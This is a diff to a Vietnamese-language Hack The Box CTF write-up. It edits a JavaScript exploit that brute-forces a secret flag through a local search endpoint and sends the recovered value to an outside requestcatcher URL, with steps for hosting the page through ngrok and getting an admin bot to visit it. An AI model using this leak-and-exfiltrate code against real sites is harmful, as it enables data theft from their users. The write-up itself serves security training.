@@ -243,9 +243,9 @@ Script
 <html>
 <script>
 var ip = '127.0.0.1:1337'; // Only IP
-var myWeb = 'https://duypt.requestcatcher.com'; //URL để lấy flag
-var flag = 'HTB';
-var chars = '!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+var myWeb = 'https://duypt.requestcatcher.com'; //URL get Flag, change it
+var flag = 'HTB{5w33t';
+var chars = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
 var url = `http://${ip}/api/entries/search?q=`
 
 async function getPartialFlag(char){ //Hàm thực hiện gửi request tới url để xem có lỗi hay không
@@ -258,12 +258,13 @@ async function getPartialFlag(char){ //Hàm thực hiện gửi request tới ur
  });
 }
 async function getFlag(chars) {  //Hàm thực hiện brute-force flag
- var b = false; 
+var b = false; var char;
  for(var i=0; i < chars.length; i++){
-    await getPartialFlag(chars[i]).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } ); //Thực hiện ghép flag, nếu là ký tự cuối cùng ('}') gán b=True để break
-    if(b) break;
-}
- fetch(`${myWeb}/flag=${flag}`, {method:'get'}); // Thực hiện trả về kết quả cho hacker 
+ char = chars[i];
+ await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
+ if(b) break;}
+
+fetch(`${myWeb}/?flag=${flag}`, {method:'get'}); // Thực hiện trả về kết quả cho hacker 
 };
 getFlag(chars);
 </script>
@@ -272,9 +273,16 @@ getFlag(chars);
 ```
 
 Mọi người cần built một web để máy bên HTB có thể truy cập vào được, ở đây mình dùng apache + ngrok
++ Apache là web server 
++ Ngrok để minh tạo một IP public link với web của mình 
+
+![image](https://user-images.githubusercontent.com/86275419/228779801-e6197a50-99f0-43f3-8ad6-5ff31e8ec3ec.png)
 
 Thực hiện gửi link web của mình vào chức năng `Report Abusive Content By Humans` 
 
-![image](https://user-images.githubusercontent.com/86275419/228696618-1cfcbab7-f971-4292-98a7-c5eb356498a6.png)
+![image](https://user-images.githubusercontent.com/86275419/228794997-df9e1d95-ec16-40cc-82b6-8250c23e0248.png)
 
 Giờ ta chỉ ngồi đợi Flag về thôi
+
+![image](https://user-images.githubusercontent.com/86275419/228799148-9edfc8d8-c336-4df0-953e-c01879bfa4f4.png)
+
